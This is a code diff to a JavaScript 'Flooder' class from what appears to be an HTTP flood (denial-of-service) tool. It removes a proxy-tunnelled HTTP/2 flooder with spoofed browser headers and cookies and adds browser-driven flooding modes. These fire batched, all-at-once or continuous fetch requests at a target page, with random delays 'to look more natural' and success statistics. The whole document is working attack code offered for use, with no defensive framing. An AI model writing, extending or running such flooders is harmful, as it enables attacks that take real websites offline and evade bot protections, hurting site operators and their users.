@@ -1,8 +1,3 @@
-import http2 from "node:http2";
-import net from "node:net";
-import tls from "node:tls";
-import { URL } from "node:url";
-
 import { log } from "../util/Util.js";
 import { randnum } from "../util/Helpers.js";
 
@@ -12,171 +7,245 @@ export class Flooder {
     Object.assign(this, browserObject);
   }
 
-  buildAuthority(url, targetPort = null) {
-    const newUrl = new URL(url);
-    const scheme = newUrl.protocol.replace(":", "");
-    const port = targetPort || newUrl.port;
-
-    const defaultPort = scheme === "https" ? "443" : "80";
-
-    if (port && port !== defaultPort) {
-      return `${newUrl.hostname}:${port}`;
-    }
-    return newUrl.hostname;
-  }
-  resolvePort(url, overridePort = null) {
-    const newUrl = new URL(url);
-    const scheme = newUrl.protocol.replace(":", "");
-    return overridePort || newUrl.port || (scheme === "https" ? "443" : "80");
-  }
-  async start() {
-    const authority = new URL(this.url);
-    const path = (authority.pathname || "/") + (authority.search || "");
+  async start(page) {
     log(
       "FLOODER",
-      `Flooder instance ${this.browserId} starting flood on ${this.url} via proxy ${this.proxyHost}`
+      `Flooder instance ${this.browserId} starting flood with ${this.browserConfig.rps} requests`
     );
-    /**
-     * Debug: console.dir(this.cookieObj, { depth: null });
-     *        console.dir(this.browserData, { depth: null });
-     * */
-    // First: create proxy tunnel and TLS socket BEFORE http2.connect
-    const createTunnel = () => {
-      return new Promise((resolve, reject) => {
-        const conn = net.connect({
-          host: this.proxyHost,
-          port: Number(this.proxyPort),
-        });
 
-        /* 
-          conn.once("connect", () => {
-            conn.write(
-              `CONNECT ${authority.hostname}:${
-                authority.port || 443
-              } HTTP/1.1\r\nHost: ${authority.hostname}\r\n\r\n`
-            );
+    await page.evaluate(() => {
+      window.__floodStats = { success: 0, failed: 0, total: 0 };
+
+      window.__sendRequest = async (index, method = "GET") => {
+        const startTime = performance.now();
+        try {
+          const response = await fetch(window.location.href, {
+            method: method,
+            credentials: "include",
+            cache: "no-cache",
+            mode: "same-origin",
+            redirect: "follow",
+            headers: {
+              "Cache-Control": "no-cache",
+              Pragma: "no-cache",
+            },
           });
-        */
-        conn.once("connect", () => {
-          const targetPort = this.resolvePort(
-            this.url,
-            this.browserConfig?.targetPort
-          );
-          conn.write(
-            `CONNECT ${authority.hostname}:${targetPort} HTTP/1.1\r\nHost: ${authority.hostname}\r\n\r\n`
-          );
-        });
 
-        let buff = Buffer.alloc(0);
+          const duration = Math.round(performance.now() - startTime);
+          window.__floodStats.total++;
 
-        const onData = (chunk) => {
-          buff = Buffer.concat([buff, chunk]);
-          const headerEnd = buff.indexOf("\r\n\r\n");
-          if (headerEnd !== -1) {
-            const headerStr = buff.slice(0, headerEnd).toString();
-            if (!/HTTP\/1\.\d 200/.test(headerStr)) {
-              conn.destroy();
-              return reject(
-                new Error(
-                  `Proxy connection failed: ${
-                    headerStr.split("\r\n")[0]
-                  } for proxy ${this.proxyHost} on port ${this.proxyPort}`
-                )
-              );
-            }
-
-            if (buff.length > headerEnd + 4) {
-              conn.unshift(buff.slice(headerEnd + 4));
-            }
-
-            conn.removeListener("data", onData);
-
-            const tlsSocket = tls.connect({
-              socket: conn,
-              servername: authority.hostname,
-              ALPNProtocols: ["h2"],
-            });
-
-            tlsSocket.once("secureConnect", () => resolve(tlsSocket));
-            tlsSocket.on("error", reject);
+          if (response.ok) {
+            window.__floodStats.success++;
+            return { success: true, status: response.status, duration, index };
+          } else {
+            window.__floodStats.failed++;
+            return { success: false, status: response.status, duration, index };
           }
-        };
-
-        conn.on("data", onData);
-        conn.on("error", reject);
-      });
-    };
-
-    // Await tunnel creation
-    const socket = await createTunnel();
-
-    console.log(this.url);
-    // Now pass a sync createConnection that returns the socket
-    const client = http2.connect(this.url, {
-      createConnection: () => socket,
-    });
-
-    client.on("error", (err) => {
-      console.error(
-        `Error in flooder instance ${this.browserId}: ${err.message}`
-      );
-    });
-    const cookieHeader = toCookieHeader(this.cookieObj.cookie);
-    const reqMethods = ["GET", "POST"];
-    const sendRequest = () => {
-      if (client.destroyed || client.closed) return;
-
-      const headers = {
-        ":method": reqMethods[randnum(0, reqMethods.length)],
-        ":path": path,
-        ":authority": this.buildAuthority(
-          this.url,
-          this.browserConfig?.targetPort
-        ),
-        ":scheme": "https",
-        cookie: cookieHeader,
-        "user-agent": this.userAgent,
-        accept: "*/*",
-        "accept-language": `${this.locale},${this.locale.split("-")[0]};q=0.9`,
-        "accept-encoding": "gzip, deflate, br",
-        "cache-control": "no-cache",
-        "sec-fetch-mode": "navigate",
-        "upgrade-insecure-requests": "1",
+        } catch (error) {
+          window.__floodStats.failed++;
+          window.__floodStats.total++;
+          return { success: false, error: error.message, index };
+        }
       };
+    });
 
-      //console.dir(headers, { depth: null });
-      const req = client.request(headers);
-      req.on("response", (headers) => {
-        const statusCode = headers[":status"];
+    // Option 1: Sequential requests with logging
+    if (this.browserConfig.rps <= 20) {
+      for (let i = 0; i < this.browserConfig.rps; i++) {
+        const method = Math.random() > 0.9 ? "POST" : "GET";
+
+        const result = await page.evaluate(
+          async (idx, m) => await window.__sendRequest(idx, m),
+          i,
+          method
+        );
+
+        if (result.success) {
+          log(
+            "SUCCESS",
+            `Browser ${this.browserId}: Request ${i + 1}/${
+              this.browserConfig.rps
+            } - ${result.status} (${result.duration}ms)`
+          );
+        } else {
+          log(
+            "WARN",
+            `Browser ${this.browserId}: Request ${i + 1}/${
+              this.browserConfig.rps
+            } - ${result.status || "Failed"}`
+          );
+        }
+
+        // Small random delay between requests to look more natural
+        if (i < this.browserConfig.rps - 1) {
+          await new Promise((r) => setTimeout(r, randnum(100, 300)));
+        }
+      }
+    } else {
+      const batchSize = 10;
+      const batches = Math.ceil(this.browserConfig.rps / batchSize);
+
+      for (let batch = 0; batch < batches; batch++) {
+        const batchStart = batch * batchSize;
+        const batchEnd = Math.min(
+          batchStart + batchSize,
+          this.browserConfig.rps
+        );
+
         log(
           "FLOODER",
-          `Browser ${this.browserId} Flooder status: ${statusCode}`
+          `Browser ${this.browserId}: Sending batch ${
+            batch + 1
+          }/${batches} (requests ${batchStart + 1}-${batchEnd})`
         );
-      });
-      req.on("data", () => {});
-      req.on("end", sendRequest);
-      req.on("error", () => {});
-      req.end();
-    };
 
-    for (let i = 0; i < this.browserConfig.cpspp; i++) {
-      console.log("Sending Request: %d", i);
-      sendRequest();
+        await page.evaluate(
+          async (start, end) => {
+            const promises = [];
+            for (let i = start; i < end; i++) {
+              const method = Math.random() > 0.9 ? "POST" : "GET";
+              promises.push(window.__sendRequest(i, method));
+            }
+            await Promise.allSettled(promises);
+          },
+          batchStart,
+          batchEnd
+        );
+
+        // Small delay between batches
+        if (batch < batches - 1) {
+          await new Promise((r) => setTimeout(r, randnum(200, 500)));
+        }
+      }
     }
 
-    return { success: true, browserData: this.browserData };
+    // Get final statistics
+    const stats = await page.evaluate(() => window.__floodStats);
+
+    log(
+      "SUCCESS",
+      `Browser ${this.browserId} flood complete: ${stats.success}/${stats.total} successful, ${stats.failed} failed`
+    );
+
+    return { success: true, stats, browserData: this.browserData };
   }
-}
-function toCookieHeader(cookies) {
-  if (!cookies) return "";
-  if (Array.isArray(cookies)) {
-    return cookies.map((c) => `${c.name}=${c.value}`).join("; ");
+
+  // Alternative: Ultra-fast parallel flooding (use with caution)
+  async startAggressive(page) {
+    log(
+      "FLOODER",
+      `Browser ${this.browserId} starting AGGRESSIVE flood with ${this.browserConfig.rps} concurrent requests`
+    );
+
+    // Inject and execute all requests at once
+    const results = await page.evaluate(async (rps) => {
+      const requests = [];
+      for (let i = 0; i < rps; i++) {
+        const method = Math.random() > 0.9 ? "POST" : "GET";
+        requests.push(
+          fetch(window.location.href, {
+            method: method,
+            credentials: "include",
+            cache: "no-cache",
+            mode: "same-origin",
+          })
+            .then((r) => ({ success: true, status: r.status, index: i }))
+            .catch((e) => ({ success: false, error: e.message, index: i }))
+        );
+      }
+
+      return await Promise.allSettled(requests);
+    }, this.browserConfig.rps);
+
+    const successful = results.filter(
+      (r) => r.status === "fulfilled" && r.value.success
+    ).length;
+
+    log(
+      "SUCCESS",
+      `Browser ${this.browserId} aggressive flood complete: ${successful}/${this.browserConfig.rps} successful`
+    );
+
+    return {
+      success: true,
+      stats: { success: successful, total: this.browserConfig.rps },
+      browserData: this.browserData,
+    };
   }
-  if (cookies.cookie && cookies.cookie.name && cookies.cookie.value) {
-    return `${cookies.cookie.name}=${cookies.cookie.value}`;
+
+  // Alternative: Keep-alive connection with continuous requests
+  async startContinuous(page, durationSeconds = 30) {
+    log(
+      "FLOODER",
+      `Browser ${this.browserId} starting CONTINUOUS flood for ${durationSeconds}s`
+    );
+
+    // Start continuous flooding in the page
+    await page.evaluate((duration) => {
+      window.__stopFlooding = false;
+      window.__floodStats = { success: 0, failed: 0, total: 0 };
+
+      const flood = async () => {
+        const endTime = Date.now() + duration * 1000;
+
+        while (Date.now() < endTime && !window.__stopFlooding) {
+          try {
+            const response = await fetch(window.location.href, {
+              method: "GET",
+              credentials: "include",
+              cache: "no-cache",
+            });
+
+            window.__floodStats.total++;
+            if (response.ok) {
+              window.__floodStats.success++;
+            } else {
+              window.__floodStats.failed++;
+            }
+          } catch (e) {
+            window.__floodStats.failed++;
+            window.__floodStats.total++;
+          }
+
+          // Very small delay to prevent browser lockup
+          await new Promise((r) => setTimeout(r, 50));
+        }
+      };
+
+      // Start flooding
+      flood();
+    }, durationSeconds);
+
+    // Monitor progress
+    const startTime = Date.now();
+    const endTime = startTime + durationSeconds * 1000;
+
+    while (Date.now() < endTime) {
+      await new Promise((r) => setTimeout(r, 5000)); // Check every 5 seconds
+
+      const stats = await page.evaluate(() => window.__floodStats);
+      const elapsed = Math.round((Date.now() - startTime) / 1000);
+      const rps = Math.round(stats.total / elapsed);
+
+      log(
+        "INFO",
+        `Browser ${this.browserId}: ${stats.total} requests sent (${rps} req/s) - ${stats.success} success, ${stats.failed} failed`
+      );
+    }
+
+    // Stop flooding and get final stats
+    await page.evaluate(() => {
+      window.__stopFlooding = true;
+    });
+    await new Promise((r) => setTimeout(r, 1000)); // Wait for last requests
+
+    const finalStats = await page.evaluate(() => window.__floodStats);
+
+    log(
+      "SUCCESS",
+      `Browser ${this.browserId} continuous flood complete: ${finalStats.success}/${finalStats.total} successful`
+    );
+
+    return { success: true, stats: finalStats, browserData: this.browserData };
   }
-  if (cookies.name && cookies.value) {
-    return `${cookies.name}=${cookies.value}`;
-  }
-  return "";
 }
